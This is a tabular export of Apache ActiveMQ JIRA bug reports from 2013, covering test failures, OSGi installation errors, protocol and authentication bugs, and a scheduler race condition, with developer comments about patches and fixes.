Stomp unit tests fail,AMQ-4704,12666283,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,jbonofre,jbonofre,jbonofre,30/Aug/13 09:44,03/Sep/13 15:51,14/Jul/23 05:43,03/Sep/13 15:51,,,,,,5.9.0,,,Test Cases,,,,0,,,,,,,,,"Failed tests:   testSendMessageWithDelay(org.apache.activemq.transport.stomp.StompNIOSSLTest)
  testTempDestination(org.apache.activemq.transport.stomp.StompNIOSSLTest): expected:<[Hello World]> but was:<[java.lang.SecurityException: User system is not authorized to read from: temp-queue://ID:vostro-41790-1377853697900-4:46:1
  testReplyToAcrossConnections(org.apache.activemq.transport.stomp.StompNIOSSLTest): Receipt Frame: ERROR
  testReplyToDestinationNaming(org.apache.activemq.transport.stomp.StompNIOSSLTest)
  testSendMessageWithDelay(org.apache.activemq.transport.stomp.StompNIOTest)
  testTempDestination(org.apache.activemq.transport.stomp.StompNIOTest): expected:<[Hello World]> but was:<[java.lang.SecurityException: User system is not authorized to read from: temp-queue://ID:vostro-58773-1377854133134-4:46:1
  testReplyToAcrossConnections(org.apache.activemq.transport.stomp.StompNIOTest): Receipt Frame: ERROR
  testReplyToDestinationNaming(org.apache.activemq.transport.stomp.StompNIOTest)
  testSendMessageWithDelay(org.apache.activemq.transport.stomp.StompSslAuthTest)
  testTempDestination(org.apache.activemq.transport.stomp.StompSslAuthTest): expected:<[Hello World]> but was:<[java.lang.SecurityException: User CN=localhost, OU=activemq.org, O=activemq.org, L=LA, ST=CA, C=US is not authorized to read from: temp-queue://ID:vostro-35025-1377854435243-2:46:1
  testReplyToAcrossConnections(org.apache.activemq.transport.stomp.StompSslAuthTest): Receipt Frame: ERROR
  testReplyToDestinationNaming(org.apache.activemq.transport.stomp.StompSslAuthTest)
  testSendMessageWithDelay(org.apache.activemq.transport.stomp.StompSslTest)
  testTempDestination(org.apache.activemq.transport.stomp.StompSslTest): expected:<[Hello World]> but was:<[java.lang.SecurityException: User system is not authorized to read from: temp-queue://ID:vostro-34293-1377854833774-4:46:1
  testReplyToAcrossConnections(org.apache.activemq.transport.stomp.StompSslTest): Receipt Frame: ERROR
  testReplyToDestinationNaming(org.apache.activemq.transport.stomp.StompSslTest)
  testSendMessageWithDelay(org.apache.activemq.transport.stomp.StompTest)
  testTempDestination(org.apache.activemq.transport.stomp.StompTest): expected:<[Hello World]> but was:<[java.lang.SecurityException: User system is not authorized to read from: temp-queue://ID:vostro-40068-1377855151851-4:46:1
  testReplyToAcrossConnections(org.apache.activemq.transport.stomp.StompTest): Receipt Frame: ERROR
  testReplyToDestinationNaming(org.apache.activemq.transport.stomp.StompTest)

Tests run: 519, Failures: 20, Errors: 0, Skipped: 0
",,jbonofre,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Aug/13 20:11;tabish;StompTestsPAtch.txt;https://issues.apache.org/jira/secure/attachment/12600847/StompTestsPAtch.txt",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,346222,,,Tue Sep 03 15:51:29 UTC 2013,,,,,,,,,,,"0|i1npbr:",346523,,,,,,,,,,,,,,,,,,,,,"30/Aug/13 20:11;tabish;This will fix them up, will apply once we have a repo again. ;;;","31/Aug/13 11:40;jbonofre;Thanks for the patch Timothy. I apply on my local repo to test if it's OK.;;;","03/Sep/13 15:51;tabish;fix applied. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq-osgi installation fail on Karaf 2.3.x,AMQ-4703,12666260,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,jbonofre,jbonofre,jbonofre,30/Aug/13 07:35,02/Oct/13 09:29,14/Jul/23 05:43,02/Oct/13 09:29,5.9.0,,,,,5.9.0,,,OSGi/Karaf,,,,0,,,,,,,,,"The installation of the activemq feature fails on Karaf 2.3.x:

karaf@root> features:install activemq
Error executing command: Could not start bundle mvn:org.apache.activemq/activemq-osgi/5.9-SNAPSHOT in feature(s) activemq-client-5.9-SNAPSHOT: The bundle ""org.apache.activemq.activemq-osgi_5.9.0.SNAPSHOT [88]"" could not be resolved. Reason: The native code paths cannot be found: META-INF/native/linux64/libleveldbjni.so; processor=x86-64; osname=Linux
",,davsclaus,ilazebny,jbonofre,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Sep/13 08:30;jbonofre;AMQ-4703.patch;https://issues.apache.org/jira/secure/attachment/12602551/AMQ-4703.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,346199,,,Wed Oct 02 09:29:35 UTC 2013,,,,,,,,,,,"0|i1np73:",346500,,,,,,,,,,,,,,,,,,,,,"30/Aug/13 07:35;jbonofre;I'm working on it.;;;","11/Sep/13 08:10;jbonofre;I checked in the activemq-osgi bundle, and the META-INF/native folder doesn't exist. I'm reviewing the build of activemq-osgi bundle.;;;","11/Sep/13 08:30;jbonofre;This patch remove the native statements to use the Java driver.;;;","11/Sep/13 08:35;jbonofre;If activemq feature installs correctly with this patch, the default activemq.xml broker configuration is missing. I'm adding this.;;;","11/Sep/13 08:57;jbonofre;I checked in ActiveMQ 5.7.0, and the activemq.xml was not provided in the deploy folder by the activemq feature. It's the responsibility of the user to drop the activemq.xml in the deploy folder.;;;","11/Sep/13 09:15;jbonofre;I'm testing the activemq-broker feature.;;;","11/Sep/13 09:25;jbonofre;activemq-broker feature works fine:

- karaf@root> activemq:list 
brokerName = amq-broker

- karaf@root> activemq:bstat

TotalConsumerCount = 0
Uptime = 1 minute
TotalDequeueCount = 0
BrokerName = amq-broker
TotalEnqueueCount = 1
TotalMessageCount = 0

Name = KahaDBPersistenceAdapter[/home/jbonofre/apache-karaf-2.3.1/data/amq-broker/kahadb]

connectorName = openwire

- karaf@root> web:list
   ID   State         Web-State       Level  Web-ContextPath           Name
[ 121] [Active     ] [Deployed   ]  [   50] [/activemqweb            ] activemq-web-console (5.9.0.SNAPSHOT)

But, when I access to http://localhost:8181/activemqweb, I got an error in the ActiveMQ webconsole:

2013-09-11 11:18:40,958 | WARN  | qtp925448244-86  | ServletHandler                   | pse.jetty.servlet.ServletHandler  514 | 58 - org.eclipse.jetty.util - 7.6.8.v20121106 | /activemqweb/index.jsp
javax.el.ELException: java.lang.RuntimeException: java.io.IOException: Failed to retrieve RMIServer stub: javax.naming.CommunicationException [Root exception is java.rmi.UnmarshalException: error unmarshalling return; nested exception is: 

The etc/org.apache.activemq.webconsole.cfg defines the correct properties used by the webconsole. I gonna take a look on that.
;;;","02/Oct/13 09:29;davsclaus;Works fine now;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Error resolving org.jvnet.jaxb2_commons packages,AMQ-4702,12666176,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,janstey,janstey,janstey,29/Aug/13 18:40,05/Sep/13 12:43,14/Jul/23 05:43,04/Sep/13 18:24,,,,,,5.9.0,,,,,,,0,,,,,,,,,"Getting the following on trunk when trying to install activemq-osgi:

Error when installing feature activemq: java.lang.Exception: Can not resolve feature:
Unsatisfied requirement(s):
---------------------------
package&(package=org.jvnet.jaxb2_commons.lang)(version>=0.6.0)(!(version>=1.0.0)))
activemq-osgi
package&(package=org.jvnet.jaxb2_commons.locator)(version>=0.6.0)(!(version>=1.0.0)))
activemq-osgi
package&(package=org.jvnet.jaxb2_commons.locator.util)(version>=0.6.0)(!(version>=1.0.0)))
activemq-osgi",,dejanb,janstey,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4682,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,346115,,,Thu Sep 05 12:43:37 UTC 2013,,,,,,,,,,,"0|i1noof:",346416,,,,,,,,,,,,,,,,,,,,,"29/Aug/13 18:46;janstey;See the SVN is locked down down. Will commit after move to git :-)

[janstey@bender activemq-karaf]$ git show 340106ac0ac138b434d26e3417dc8897ccbff04b
commit 340106ac0ac138b434d26e3417dc8897ccbff04b
Author: Jonathan Anstey <janstey@gmail.com>
Date:   Thu Aug 29 16:12:45 2013 -0230

    AMQ-4702 - Error resolving org.jvnet.jaxb2_commons packages

diff --git a/activemq-karaf/src/main/resources/features.xml b/activemq-karaf/src/main/resources/features.xml
index 560011f..0d52028 100644
--- a/activemq-karaf/src/main/resources/features.xml
+++ b/activemq-karaf/src/main/resources/features.xml
@@ -27,6 +27,7 @@
         <bundle dependency=""true"">mvn:org.apache.geronimo.specs/geronimo-jta_1.1_spec/1.1.1</bundle>
         <bundle dependency=""true"">mvn:org.apache.geronimo.specs/geronimo-jms_1.1_spec/1.1.1</bundle>
         <bundle dependency=""true"">mvn:org.apache.geronimo.specs/geronimo-j2ee-management_1.1_spec/1.0.1</bundle>
+        <bundle dependency=""true"">mvn:org.jvnet.jaxb2_commons/jaxb2-basics-runtime/${jaxb-basics-version}</bundle>
         <bundle dependency=""false"">mvn:commons-pool/commons-pool/${commons-pool-version}</bundle>
         <bundle dependency=""false"">mvn:commons-net/commons-net/${commons-net-version}</bundle>
         <bundle dependency='true'>mvn:org.apache.zookeeper/zookeeper/${zookeeper-version}</bundle>
;;;","04/Sep/13 15:25;tabish;Git is up if you want to go ahead and commit your fix now. ;;;","04/Sep/13 18:24;janstey;Good stuff! Just committed it https://git-wip-us.apache.org/repos/asf?p=activemq.git;a=commit;h=3d6065ea3ff2249b9e96ab1bb56ad3ceceaa91ca;;;","05/Sep/13 12:43;dejanb;Added additional bundle to make it work

http://git-wip-us.apache.org/repos/asf/activemq/commit/0203cde1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Durable Subscriptions are not created properly when using AMQP,AMQ-4696,12665911,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,kearls,kearls,28/Aug/13 12:44,03/Sep/13 20:14,14/Jul/23 05:43,03/Sep/13 20:14,5.8.0,,,,,5.9.0,,,,,,,0,,,,,,,,,"I can add a more detail description if needed but for now to reproduce this you'll need to comment out testUnsubscribe in the JoramJmsTest TopicSessionTest, build a snapshot, uncomment TopicSessionTest in JoramJmsTest and run that.  The testDurableSubscriber will fail.

I have a patch for this, I can post it now or after the patch for AMQ-4596 is posted",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Aug/13 12:41;kearls;AMQ-4696.patch;https://issues.apache.org/jira/secure/attachment/12600776/AMQ-4696.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,345850,,,Tue Sep 03 20:14:08 UTC 2013,,,,,,,,,,,"0|i1nn1j:",346151,,,,,,,,,,,,,,,,,,,,,"28/Aug/13 13:11;tabish;Would probably make sense to create a test outside Joram tests that reproduces this easier so we can ensure it stays fixed once the fix goes in. ;;;","30/Aug/13 12:41;kearls;This patch include the fix for AmqpProtocolConverter and a new unit test.
;;;","03/Sep/13 20:14;tabish;fixed on trunk. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cannot connect as Anonymous over MQTT TransportConnector,AMQ-4695,12665763,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,ceposta,ceposta,ceposta,27/Aug/13 18:35,03/Sep/13 19:07,14/Jul/23 05:43,03/Sep/13 19:07,5.8.0,,,,,5.9.0,,,MQTT,,,,0,,,,,,,,,"When configuring for authn/authz and allowing anonymous access, connections made on the MQTT connector cannot connect via anonymous user. See an example config here:

http://pastebin.com/91f029Aa
",,ceposta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,345702,,,Tue Sep 03 19:07:25 UTC 2013,,,,,,,,,,,"0|i1nm4n:",346003,,,,,,,,,,,,,,,,,,,,,"27/Aug/13 18:35;ceposta;
I have a test case to demonstrate this and a patch to fix it. Will get it attached here when I get a sec;;;","03/Sep/13 19:07;ceposta;Fixed on trunk @ https://git-wip-us.apache.org/repos/asf/activemq.git;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Message browsing denied for stomp protocol 1.2,AMQ-4686,12664620,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,moret,moret,20/Aug/13 15:03,20/Aug/13 15:22,14/Jul/23 05:43,20/Aug/13 15:22,5.6.0,5.7.0,5.8.0,,,5.9.0,,,Transport,,,,0,,,,,,,,,"Hello.

Connected to the broker and successfully negotiated 1.2 as the protocol version with the CONNECT frames. When sending the header browser:true within a SUBSCRIBE frame the broker logs the exception ""org.apache.activemq.transport.stomp.ProtocolException: Queue Browser feature only valid for Stomp v1.1 clients!"".

Checking file https://svn.apache.org/repos/asf/activemq/trunk/activemq-stomp/src/main/java/org/apache/activemq/transport/stomp/ProtocolConverter.java , line 557, the exception is thrown if the protocol is not 1.1 only, not 1.1 or above. Confirmed on the user list this seems to be a bug: http://activemq.2283324.n4.nabble.com/Message-browsing-with-Stomp-client-1-2-td4670514.html

Regards.","Tested on MacOS 10.8.4, Apache ActiveMQ 5.8.0 installed via brew, stompgem 1.2.14 installed via gem install, Java(TM) SE Runtime Environment (build 1.6.0_51-b11-457-11M4509)",moret,paulgale,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,344563,,,Tue Aug 20 15:22:37 UTC 2013,,,,,,,,,,,"0|i1nf3r:",344863,,,,,,,,,,,,,,,,,,,,,"20/Aug/13 15:22;tabish;fix and test added on trunk. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
LDAPLoginModule throws InvalidNameException when resolving LDAP aliases,AMQ-4685,12664057,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,podolsir,podolsir,16/Aug/13 13:15,02/Apr/14 23:58,14/Jul/23 05:43,02/Nov/13 13:50,5.x,,,,,5.10.0,5.9.1,,Broker,,,,0,,,,,,,,,"Some LDAP servers allow you to define aliases for objects. For example, consider the following LDAP directory layout:

{code}
dc=example,dc=com
   ou=ActiveMQ
      ou=Users
      ou=Roles
      ou=Destinations
   ou=People
{code}

In this layout, accounts specific to ActiveMQ go under ou=Users,ou=ActiveMQ. However, some accounts in ou=People should also be able to have access to the ActiveMQ server. To avoid duplicating accounts, you can have the regular account (objectClass=inetOrgPerson) in ou=People and create an LDAP alias (objectClass=alias) for it in ou=People. The LDAP server then takes care about the alias resolution.

The JNDI LDAP client supports LDAP alias dereferencing as well. However, the search results for resolved aliases are different. For regular entries, SearchResult.getName() returns a relative DN and SearchResult.isRelative() returns true; for dereferenced aliases, SearchResult.getName() returns a full LDAP URI with the DN of the alias target (for example, 'ldap://localhost:389/uid=bob,ou=People,dc=example,dc=com') and SearchResult.isRelative() returns false (as documented, for example, in [1]).

The code in o.a.a.jaas.LDAPLoginModule does not make this distinction. It assumes that all returned names are RDNs and passes them to NameParser.parse() which in turn raises a NamingException because an LDAP URI is obviously not an LDAP (R)DN.

The attached patch resolved the problem at least for my configuration. If isRelative() returns false, the name is parsed as an URI. Per definition of LDAP URIs, the path component is the distinguished name, which is then taken.

Of course, this does not take care of multiple layers of aliases, aliases for containers and so on - I just found it over the course of setting up LDAP  authentication in my system, which happens only to alias user accounts. It works for me with the patch and seems not to make things worse :) If needed, maybe I can do some further tests and/or correct the patch.

[1] http://docs.oracle.com/javase/jndi/tutorial/ldap/misc/aliases.html","OS Independent
OpenLDAP 2.4",davsclaus,podolsir,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Aug/13 13:20;podolsir;handle-ldap-aliases-v1.patch;https://issues.apache.org/jira/secure/attachment/12598447/handle-ldap-aliases-v1.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,344058,,,Sat Nov 02 13:50:33 UTC 2013,,,,,,,Patch Available,,,,"0|i1nc0n:",344360,,,,,,,,,,,,,,,,,,,,,"02/Nov/13 13:50;davsclaus;Thanks for the detailed explanation and the patch.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Scheduler discards overdue messages on startup,AMQ-4683,12663657,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,tabish,andrey.zavodnik,andrey.zavodnik,14/Aug/13 14:07,04/Oct/13 13:13,14/Jul/23 05:43,23/Aug/13 16:04,5.8.0,,,,,5.9.0,,,Broker,,,,0,scheduler,,,,,,,,"When message is scheduled for a delivery (using AMQ_SCHEDULED_PERIOD property) it is not posted to the queue, but saved to the scheduler’s repository instead. If Broker instance is shut down at the time for which the message is scheduled for a delivery, the scheduler will try to process the message at the next time broker is started up. Due to a bug in the scheduler implementation such messages may be dismissed rather than posted to the queue depending on the racing conditions inside the JVM.

Actual bug resides in org.apache.activemq.broker.scheduler.SchedulerBroker.getInternalScheduler() method. 
This method first calls JobSchedulerStoreImpl. getJobScheduler(String name) method which in turn creates an instance of runnable JobSchedulerImpl class and starts it.
Then SchedulerBroker registers itselfas a listener of the newly created JobSchedulerImpl.
Unfortunately this may happen after the JobSchedulerImpl have dismissed all the “missed” tasks as “fired” as there were no listeners configured.
","Windows 7 64bit, JDK 1.6.0_26",andrey.zavodnik,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4783,,AMQ-4550,,,,,,,,,,,,,,,,,,,,AMQ-4550,,,,"14/Aug/13 14:10;andrey.zavodnik;LostScheduledMessagesTest.java;https://issues.apache.org/jira/secure/attachment/12597975/LostScheduledMessagesTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,343658,,,Fri Aug 23 16:04:26 UTC 2013,,,,,,,,,,,"0|i1n9k7:",343962,,,,,,,,,,,,,,,,,,,,,"14/Aug/13 14:10;andrey.zavodnik;Test case. As the issue affected by race condition, the test may not fail every time, but it does fail often;;;","14/Aug/13 14:13;andrey.zavodnik;This issue assumes that this is an intended behaviour, but looking at the code it is obvious that it was intended that messages that have missed their delivery time will be posted upon system start up.;;;","22/Aug/13 19:45;tabish;Fixed on trunk, thanks for the great test.  ;;;","23/Aug/13 08:08;andrey.zavodnik;The current fix (revision 1516561) makes JobSchedulerImpl to wait on a semaphore until the ""main"" thread executes either doStart() or addListener().
This fix has two big issues:
1. If the ""main"" thread manages to execute addListener() before the JobSchedulerImpl thread arrives to semaphore wait() point, the JobSchedulerImpl thread will be blocked indefinitely.
2. JobSchedulerImpl is designed to accept an arbitrary number of listeners. This solution will only work when there is exactly one. If zero, worker will be blocked. If more than one, there is a chance that listeners number 2 and over will not receive a notification, just like the first one didn't in the original bug.;;;","23/Aug/13 16:04;tabish;Case 1 analysis is incorrect.
Case 2 is true although the broker implementation doesn't currently use more than one listener so it wouldn't happen this way. 

I've made some changes to make the start of dispatching separate from starting the store.  Now the start of dispatch occurs when the SchedulerBroker is started and is stopped when its stopped.  Any listener added after the broker could miss jobs but that's an inherent trait in any event based model. ;;;","23/Aug/13 16:04;tabish;Fixed on trunk, make future enhancement requests in new issues. ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Timeout for StompLoadTest.testStompUnloadLoad is too long,AMQ-4678,12663175,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,tabish,kearls,kearls,12/Aug/13 09:34,13/Aug/13 18:32,14/Jul/23 05:43,13/Aug/13 18:32,,,,,,,,,Test Cases,,,,0,,,,,,,,,"The timeout for this test is currently set to 20*60*1000*1000.  If I'm doing the math correctly that's 20,000 minutes.  This occasionally leads to build hangs.

This test (and the 3 that extend it) generally takes 70-85 seconds on my Mac, so a 5 minute timeout should be plenty.",,kearls,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Aug/13 09:35;kearls;AMQ-4678.patch;https://issues.apache.org/jira/secure/attachment/12597435/AMQ-4678.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,343176,,,Tue Aug 13 18:32:19 UTC 2013,,,,,,,Patch Available,,,,"0|i1n6l3:",343480,Unit Test Broken,,,,,,,,,,,,,,,,,,,,"13/Aug/13 18:32;tabish;patch applied, thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"ActiveMQ not compliant with JSR-250 (@PostConstruct, @PreDestroy)",AMQ-4676,12662844,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,smsiebe,smsiebe,09/Aug/13 12:41,29/Aug/13 13:43,14/Jul/23 05:43,23/Aug/13 21:28,5.8.0,,,,,5.9.0,,,Broker,Camel,STOMP,,0,,,,,,,,,"ActiveMQ is not compliant with JSR-250, which states:
2.5 javax.annotation.PostConstruct:
 [...]
 - The method MUST NOT throw a checked exception.
 - If the method throws an unchecked exception the class MUST NOT be put into
service. In the case of EJBs the method annotated with PostConstruct can
handle exceptions and cleanup before the bean instance is discarded.

2.6 javax.annotation.PreDestroy
(same as above)

An exception was thrown when attempting to deploy an application using the activemq-rar-5.8 on GF 4.0, but I believe it's safe to say that this can occur in different containers - if not now, potentially between container releases.  

Included are patches that fix this in all ActiveMQ components.  Most check exceptions thrown were Exception, which was changed to RuntimeException (trapped and wrapped).  There were also IOExceptions being thrown, in which case ActiveMQ-broker now has an IORuntimeException class that is thrown.  Any downstream catches that handled the check exceptions have been converted to catch the RuntimeExceptions.

This was also reported under AMQ-4673, but the scope of that issue was a lot more limited.
",,gtully,smsiebe,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4698,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Aug/13 15:16;smsiebe;activemq-broker_AMQ-4676v2.diff;https://issues.apache.org/jira/secure/attachment/12597090/activemq-broker_AMQ-4676v2.diff","09/Aug/13 15:16;smsiebe;activemq-camel_AMQ-4676v2.diff;https://issues.apache.org/jira/secure/attachment/12597091/activemq-camel_AMQ-4676v2.diff","09/Aug/13 17:39;smsiebe;activemq-spring_AMQ-4676v2.diff;https://issues.apache.org/jira/secure/attachment/12597122/activemq-spring_AMQ-4676v2.diff","09/Aug/13 15:16;smsiebe;activemq-stomp_AMQ-4676v2.diff;https://issues.apache.org/jira/secure/attachment/12597093/activemq-stomp_AMQ-4676v2.diff",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,342846,,,Sat Aug 24 01:44:02 UTC 2013,,,,,,,Patch Available,,,,"0|i1n4jr:",343150,,,,,,,,,,,,,,,,,,,,,"09/Aug/13 12:58;gtully;@Steve thank for the patch. It is great to see an problem report with a solution :-)
I had a quick peek at the broker diff, there are a bunch of white space/formatting changes that make it difficult to easily see what has changed but it seems sensible.
one thought; rather than change the signature of the existing methods that folks may depend on, it may be better to move the annotations to new wrapper methods with the suppressed/modified exceptions. ;;;","09/Aug/13 13:07;smsiebe;That's a really good idea.  Would you like me to provide a patch with that solution?;;;","09/Aug/13 13:28;gtully;yes please!;;;","09/Aug/13 15:16;smsiebe;Attached new patches that does not cause potential backwards incompatible signature changes.;;;","23/Aug/13 21:28;tabish;Made changes to trunk based on these patches, code has changed a bit since 5.8.0.  Might want to double check that I got them all. ;;;","24/Aug/13 01:44;smsiebe;Just wanted to verify, I checked out the latest trunk and looks like you got them all.  Thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ 5.x does not support the notion of a grace-period for heart beats as supported by the STOMP protocol,AMQ-4674,12662489,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,paulgale,paulgale,07/Aug/13 20:45,02/May/14 15:10,14/Jul/23 05:43,14/Aug/13 20:20,5.8.0,,,,,5.9.0,,,,,,,0,easyfix,,,,,,,,"Regarding the configuration of heart beating the STOMP protocol spec states:

    ""- because of timing inaccuracies, the receiver SHOULD be tolerant and take into account an error margin""

However, it appears that ActiveMQ 5.x is not tolerant of any error margin. 

Despite the fact that the spec says SHOULD rather than MUST it would make the implementation of STOMP clients easier if the error margin was published.

